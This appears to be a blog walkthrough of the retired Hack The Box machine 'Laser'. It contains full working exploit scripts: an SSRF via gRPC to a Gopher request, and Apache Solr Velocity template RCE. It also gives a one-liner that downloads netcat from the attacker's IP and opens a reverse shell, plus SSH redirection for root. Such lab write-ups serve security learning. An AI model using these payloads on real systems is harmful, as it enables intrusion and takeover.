---
layout: post  
title: "Laser: Hack The Box Walkthrough"
date: 2020-12-21 07:01:05 +0000
last_modified_at: 2020-12-21 07:01:05 +0000
category: Walkthrough
tags: ["Hack The Box", Laser, retired, Linux, Insane]
comments: true
protect: false
image:
  feature: laser-htb-walkthrough.png
---

This post documents the complete walkthrough of Laser, a retired vulnerable [VM][1] created by [MrR3boot][2] and [R4J][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Laser is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65534,U:1-65535 10.10.10.201 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-09 21:06:32 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131069 ports/host]
Discovered open port 9100/tcp on 10.10.10.201
Discovered open port 22/tcp on 10.10.10.201
Discovered open port 9000/tcp on 10.10.10.201
```

Interesting list of open ports, especially `9000/tcp` and `9100/tcp`. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,9000,9100 -A --reason 10.10.10.201 -oN nmap.txt
...
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
9000/tcp open  cslistener? syn-ack ttl 63
9100/tcp open  jetdirect?  syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.80%I=7%D=8/9%Time=5F3067E8%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\
SF:xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0")%r(GenericLines,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0
SF:\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(GetRequest,3F,"\0\
SF:0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0
SF:\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0")%r(HTTPOptions,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0
SF:@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01
SF:\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(RTSPRequest,3F,"\0\0\x18\x04
SF:\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\
SF:0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")
SF:%r(RPCCheck,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\
SF:0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(DNSVersionBindReqTCP,3F,"\0\0\x18\x04\0\
SF:0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0
SF:\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(
SF:DNSStatusRequestTCP,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\
SF:0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0
SF:\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(Help,3F,"\0\0\x18\x04\0\0\0\0\0\
SF:0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(SSLSessi
SF:onReq,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x2
SF:0\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0")%r(TerminalServerCookie,3F,"\0\0\x18\x04\0\0\0\0\
SF:0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x
SF:08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(TLSSes
SF:sionReq,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\
SF:x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0");
```

### Printer Exploitation Toolkit

Since `9100/tcp` is open, let's see what we can find out with `pret.py`.

{% include image.html image_alt="1863a8cd.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/1863a8cd.png" %}

We are connected to the printer. Awesome.

{% include image.html image_alt="13f734d0.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/13f734d0.png" %}

Hmm. I wonder what's `queued`. Let's `get` that.

{% include image.html image_alt="656fc8e4.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/656fc8e4.png" %}

While we are at it, let's dump the `nvram` contents. Looks like we have the key, a 16-byte string `13vu94r6643rv19u`!

{% include image.html image_alt="060b5c9e.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/060b5c9e.png" %}

It doesn't hurt to dump the environment variables stored in the printer.

```
10.10.10.201:/> info variables
...
LPARM:PCL FONTSOURCE=I [1 ENUMERATED]
        I
LPARM:PCL FONTNUMBER=0 [2 RANGE]
        0
        50
LPARM:PCL PITCH=10.00 [2 RANGE]
        0.44
        99.99
LPARM:PCL PTSIZE=12.00 [2 RANGE]
        4.00
        999.75
LPARM:PCL SYMSET=ROMAN8 [4 ENUMERATED]
        ROMAN8
        ISOL1
        ISOL2
        WIN30
LPARM:POSTSCRIPT PRTPSERRS=OFF [2 ENUMERATED]
        OFF
        ON
LPARM:ENCRYPTION MODE=AES [CBC]
```

Looks like AES with CBC mode is in place.

### Forensic analysis of `queued`

The file `queued` (172,199 bytes in size) contains `base64`-encoded content like so.

```
b'VfgBAAAAAADO...YJRf20mrgSSQ'
```

After decoding like so, the binary (129,144 bytes in size) is obviously encrypted with it's high entropy throughout.

```
# sed '1!d' | cut -c2- | tr -d "'" | base64 -d > decoded
```

{% include image.html image_alt="f19bf253.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/f19bf253.png" %}

The entropy graph is generated with `binwalk -E decoded`. Now, let's take a look at `decoded` in a hex editor.

{% include image.html image_alt="83e7da77.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/83e7da77.png" %}

The first eight bytes (129,109) look like some kind of file size in little-endian. Let's assume the next 16 bytes is the initialization vector (IV) for AES-128-CBC, and the rest is the encrypted data from the information that we've gathered above.

_Extract IV_

```
# dd if=decoded of=iv skip=8 count=16 bs=1
16+0 records in
16+0 records out
16 bytes copied, 0.000108711 s, 147 kB/s
```

_Extract encrypted data_

```
# dd if=decoded of=encrypted skip=24 bs=1
129120+0 records in
129120+0 records out
129120 bytes (129 kB, 126 KiB) copied, 0.226008 s, 571 kB/s
```

As `encrypted` (129,120 bytes in size) is a factor of 16-bytes, we'll use the `-nopad` option of `openssl enc`.

```
# openssl enc -aes-128-cbc -d -in encrypted -nopad -iv $(xxd -p iv) -K $(echo -n 13vu94r6643rv19u | xxd -p) | file -
/dev/stdin: PDF document, version 1.4
```

Looks like we've decrypted a PDF file.

```
# dd if=decrypted of=decrypted.pdf count=129109 bs=1
129109+0 records in
129109+0 records out
129109 bytes (129 kB, 126 KiB) copied, 0.192613 s, 670 kB/s
```

### Feed Engine v1.0 Specification

{% include image.html image_alt="ed9001ff.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/ed9001ff.png" %}

{% include image.html image_alt="3e23b5a0.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/3e23b5a0.png" %}

{% include image.html image_alt="8736990d.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/8736990d.png" %}

### gRPC and Protocol Buffers

From the specification, we easily infer the service and message definition like so.

<div class="filename"><span>service.proto</span></div>

```
syntax = "proto3";

service Print {
    rpc Feed (Content) returns (Data) {}
}

message Content {
    string data = 1;
}

message Data {
    string feed = 1;
}
```

From the definition, we can generate the required `service_pb2.py` and `service_pb2_grpc.py` files required to write a simple gRPC stub in a Python client.

```
# python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. service.proto
```

It was tough trying to figure out the `base64` and `pickle` Python modules but `_InactiveRpcError` leaked quite a fair bit of information. Based on that insight, I wrote a simple Python client to communicate with the Feed Engine.

<div class="filename"><span>client.py</span></div>

```python
import grpc
import service_pb2
import service_pb2_grpc

import base64, pickle

def run():

    json = '''
    {
        "version": "v1.0",
        "title": "Printer Feed",
        "home_page_url": "http://printer.laserinternal.htb/",
        "feed_url": "http://printer.laserinternal.htb/feeds.json",
        "items": [
            {
                "id": "2",
                "context_text": "Queue jobs"
            },
            {
                "id": "1",
                "context_text": "Failed items"
            }
        ]
    }
    '''

    feed = base64.b64encode(pickle.dumps(json))

    with grpc.insecure_channel("10.10.10.201:9000") as channel:
        stub = service_pb2_grpc.PrintStub(channel)
        response = stub.Feed(service_pb2.Content(data=feed))
        return response

if __name__ == '__main__':
    print run()

```

Let's give it a shot.

```
# python client.py
Traceback (most recent call last):
  File "client.py", line 36, in <module>
    run()
  File "client.py", line 32, in run
    response = stub.Feed(service_pb2.Content(data=feed))
  File "/usr/local/lib/python2.7/dist-packages/grpc/_channel.py", line 826, in __call__
    return _end_unary_response_blocking(state, call, False, None)
  File "/usr/local/lib/python2.7/dist-packages/grpc/_channel.py", line 729, in _end_unary_response_blocking
    raise _InactiveRpcError(state)
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')"
        debug_error_string = "{"created":"@1597377807.814584972","description":"Error received from peer ipv4:10.10.10.201:9000","file":"src/core/lib/surface/call.cc","file_line":1062,"grpc_message":"Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')","grpc_status":2}"
>
```

Interesting. Where have I seen `6, 'Could not resolve host: printer.laserinternal.htb'` before? Anyway, the error was due to what's present in `feed_url`. What if I substitute `http://printer.laserinternal.htb` with my own IP address?


```
# python client.py
feed: "Pushing feeds"
```

Meanwhile this appeared at my Apache access log.

```
10.10.10.201 - - [14/Aug/2020:04:09:15 +0000] "GET /feeds.json HTTP/1.1" 404 434 "-" "FeedBot v1.0"
```

### Fashioning a port scanner

I got it. The `feed_url` was fetched with `curl`, no wonder the error message looked familiar. See what happens when I use the gRPC client to connect to a closed port on my machine.

```
# python client.py
Traceback (most recent call last):
  File "client.py", line 36, in <module>
    print run()
  File "client.py", line 32, in run
    response = stub.Feed(service_pb2.Content(data=feed))
  File "/usr/local/lib/python2.7/dist-packages/grpc/_channel.py", line 826, in __call__
    return _end_unary_response_blocking(state, call, False, None)
  File "/usr/local/lib/python2.7/dist-packages/grpc/_channel.py", line 729, in _end_unary_response_blocking
    raise _InactiveRpcError(state)
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: (7, 'Failed to connect to 10.10.14.31 port 70: Connection refused')"
        debug_error_string = "{"created":"@1597493454.833217817","description":"Error received from peer ipv4:10.10.10.201:9000","file":"src/core/lib/surface/call.cc","file_line":1062,"grpc_message":"Exception calling application: (7, 'Failed to connect to 10.10.14.31 port 70: Connection refused')","grpc_status":2}"
>
```

Compare it to the output of `curl`.

```
# curl 10.10.14.31:70
curl: (7) Failed to connect to 10.10.14.31 port 70: Connection refused
```

Armed with this insight, we can re-purpose our gRPC client code into a port scanner of sorts, scanning in ports 1 to 9999, like so.

<div class="filename"><span>scanner.py</span></div>

```python
import grpc
import service_pb2
import service_pb2_grpc

import base64, os, pickle, zlib

def scan(port):

    json = '''
    {
        "version": "v1.0",
        "title": "Printer Feed",
        "home_page_url": "http://printer.laserinternal.htb/",
        "feed_url": "http://localhost:%d/",
        "items": [
            {
                "id": "2",
                "context_text": "Queue jobs"
            },
            {
                "id": "1",
                "context_text": "Failed items"
            }
        ]
    }
    '''

    feed = base64.b64encode(pickle.dumps(json % port))

    with grpc.insecure_channel("10.10.10.201:9000") as channel:
        stub = service_pb2_grpc.PrintStub(channel)
        response = stub.Feed(service_pb2.Content(data=feed))
        return response

if __name__ == '__main__':
    for port in range(1,10000):
        try:
            response = str(scan(port)).split('\n')[0]
        except Exception as error:
            if "refused" not in str(error.details()):
                print "%05d: %s" % (port, "open")
        else:
            print "%05d: %s" % (port, response)

```

{% include image.html image_alt="5b9bc844.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/5b9bc844.png" %}

Interesting. I wonder what's behind `8983/tcp`?

### Apache Solr RCE via Velocity template

The most recent and relevant exploit on Apache Solr that I could find without any prequisites is EDB-ID [47572](https://www.exploit-db.com/exploits/47572). There's one small problem though—I don't know the core.

> In Solr, the term _core_ is used to refer to a single index and associated transaction log and configuration files

Well, recall the specification? The core was actually hinted very subtly.

{% include image.html image_alt="2aff6441.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/2aff6441.png" %}

If I had to guess, I would say **staging** is the core name. For the exploit to work, we need to send in a POST request to set `params.resource.loader.enabled` to `true`. How are we going to do that with `curl`? Enter [Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)). I've decided to split the proof-of-concept into two components for reasons that will be clear later: a _trigger_ and an _exploit_, the trigger obviously to set the above said parameter to `true` and the exploit to execute remote command.

<div class="filename"><span>trigger.py</span></div>

```python
import grpc
import service_pb2
import service_pb2_grpc

import base64, pickle, urllib

json = '''
{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "http://printer.laserinternal.htb/",
    "feed_url": "%s",
    "items": [
        {
            "id": "2",
            "context_text": "Queue jobs"
        },
        {
            "id": "1",
            "context_text": "Failed items"
        }
    ]
}
'''


def trigger(url):

    headers  = ""
    headers += "POST /solr/staging/config HTTP/1.1\r\n"
    headers += "Host: localhost:8983\r\n"
    headers += "Content-Type: application/json\r\n"
    headers += "Content-Length: %d\r\n"
    headers += "\r\n"
    headers += "%s"

    payload  = '{\r\n'
    payload += '  "update-queryresponsewriter": {\r\n'
    payload += '    "startup": "lazy",\r\n'
    payload += '    "name": "velocity",\r\n'
    payload += '    "class": "solr.VelocityResponseWriter",\r\n'
    payload += '    "template.base.dir": "",\r\n'
    payload += '    "solr.resource.loader.enabled": "true",\r\n'
    payload += '    "params.resource.loader.enabled": "true"\r\n'
    payload += '  }\r\n'
    payload += '}'

    feed = base64.b64encode(pickle.dumps(json % (url + urllib.quote(headers % (len(payload), payload)))))

    print json % (url + urllib.quote(headers % (len(payload), payload)))

    with grpc.insecure_channel("10.10.10.201:9000") as channel:
        stub = service_pb2_grpc.PrintStub(channel)
        response = stub.Feed(service_pb2.Content(data=feed))
        return response


if __name__ == '__main__':

    trigger("gopher://localhost:8983//")

```

<div class="filename"><span>exploit.py</span></div>

```python
import grpc
import service_pb2
import service_pb2_grpc

import base64, pickle, sys, time, urllib

json = '''
{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "http://printer.laserinternal.htb/",
    "feed_url": "http://localhost:8983/solr/staging/%s",
    "items": [
        {
            "id": "2",
            "context_text": "Queue jobs"
        },
        {
            "id": "1",
            "context_text": "Failed items"
        }
    ]
}
'''

def exploit(cmd):

    command  = urllib.quote(cmd)

    payload  = ""
    payload += "select?q=1&&wt=velocity&v.template=custom&v.template.custom="
    payload += "%23set($x=%27%27)+"
    payload += "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
    payload += "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
    payload += "%23set($str=$x.class.forName(%27java.lang.String%27))+"
    payload += "%23set($ex=$rt.getRuntime().exec(%27" + command
    payload += "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
    payload += "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

    feed = base64.b64encode(pickle.dumps(json % payload))

    print json % payload

    with grpc.insecure_channel("10.10.10.201:9000") as channel:
        stub = service_pb2_grpc.PrintStub(channel)
        response = stub.Feed(service_pb2.Content(data=feed))
        return response


if __name__ == '__main__':

    print exploit(sys.argv[1])

```

Let's give it a shot.

{% include image.html image_alt="c9eab335.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/c9eab335.png" %}

An explanation of what happened is in order. First of all, I've chosen to execute a simple HTTP request to my `nc` listening on `80/tcp` because I knew `curl` is available on the remote machine. Next, once `trigger.py` is executed, I need to kill it with a Ctrl-C because of the connection timeout issues mentioned in the decrypted PDF. As you can see from above, remote command execution was successful.

## Foothold

Once we have remote command execution, we can transfer `nc` with the `-c` or `-e` switches to launch a reverse shell like so.

```
# python trigger.py; python exploit.py "curl -s -o /tmp/nc 10.10.14.42/nc" && python exploit.py "chmod 777 /tmp/nc" && python exploit.py "/tmp/nc 10.10.14.42 1234 -e /bin/bash"
```

{% include image.html image_alt="7f22c605.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/7f22c605.png" %}

I'll choose SSH over any filmsy shell any day!

{% include image.html image_alt="fe0fa2d6.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/fe0fa2d6.png" %}

### Getting `user.txt`

The file `user.txt` is at `/home/solr`.

{% include image.html image_alt="da6750db.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/da6750db.png" %}

## Privilege Escalation

During enumeration of `solr`'s account, I notice the following when I run `pspy64`.

{% include image.html image_alt="8b164f35.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/8b164f35.png" %}

If I had to guess, I would say that `c413d115b3d87664499624e7826d8c5a` is the `root` SSH password to `172.18.0.2` and that `/tmp/clear.sh` has something to do with privilege escalation.

### Inception

Obviously `root` copies `/root/clear.sh` to `172.18.0.2:/tmp/clear.sh` via `scp` for execution and then removes it.

{% include image.html image_alt="dc1722bb.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/dc1722bb.png" %}

What if we redirect the SSH traffic bound for `172.18.0.2` (docker) to `172.18.0.1` (laser) and we create a malicious `/tmp/clear.sh` in `172.18.0.1` (laser)? Will the real `root` of `172.18.0.1` (laser) execute `/tmp/clear.sh`?

### Will the real `root` please stand up?

{% include image.html image_alt="b8b8b5ea.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/b8b8b5ea.png" %}

Password checked! And this is what our malicious `/tmp/clear.sh` looks like.

{% include image.html image_alt="822f907a.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/822f907a.png" %}

Next, we have to copy `socat` to `172.18.0.2`, kill off `sshd` and set up the redirection.

{% include image.html image_alt="f52b8034.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/f52b8034.png" %}

Meanwhile...

{% include image.html image_alt="092d26a3.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/092d26a3.png" %}

### Getting `root.txt`

Log in to `root@172.18.0.1` and we are done.

{% include image.html image_alt="60316139.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/60316139.png" %}

{% include image.html image_alt="c8f1fa50.png" image_src="/77e0085d-3198-472a-9f56-bf0531cc9eb3/c8f1fa50.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/269
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/home/users/profile/13243
[4]: https://www.hackthebox.eu/
